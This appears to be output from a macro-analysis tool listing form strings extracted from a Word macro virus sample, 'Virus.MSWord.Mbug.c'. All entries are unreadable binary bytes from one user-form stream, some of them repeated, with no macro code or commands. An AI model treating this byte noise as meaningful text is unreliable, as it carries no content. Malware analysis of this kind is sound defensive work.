VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�HQ"��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
96�t�1�I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%2�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
01�dI�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x
��'ǡHu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5
1hR�K�6t�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�>�Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���kկ1b�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i}�-�*O�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���P�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����~g�%�upǯ���P˸�^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i3��,4�Z�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"a�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����1X'���5h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v6��F��P����Zwpᾫ��k�m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w2W:�f��J�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�L��խۥ~�s��ËG_��y���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�|w��yo7<;�wڟ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��FU�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|D�7ր
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
` �hX�8x��e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x؋^M�"�-Bf#Zj�x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F���#�:�5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	(�PÓ� �P:7Ȑ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i3� C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
36��b�٨
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@C���9g�v��%aV�5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�ɖUJ�p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:,�g�qvV�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�'����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Wg�*�i�G��ى�=�z�`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ꩁ5gބ�]�gԁ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��˕�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{_�r.��Pi:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d̮�cw;�5ia�Ņ듹Z�ַq��XZR�&X<|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|(xT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}fk�M_�p�Wjݫ�5|%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�íR�4f��9���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,h���p��6h9�Uk�K
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6x䢞2k[�1������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

h*�b�)�`�F7_U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��CP0�yý������!��Ԣlʐ��*]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c���=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�mӜ^�<�F7?�6a�ϰ������6��W�VC^��{�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7�7�o�]��7��p��[Į�.�.C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^���+n��Z*���2�.<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j伖k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(((333fff�������������fff33̙��33�ff�33
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f@ 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙X0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
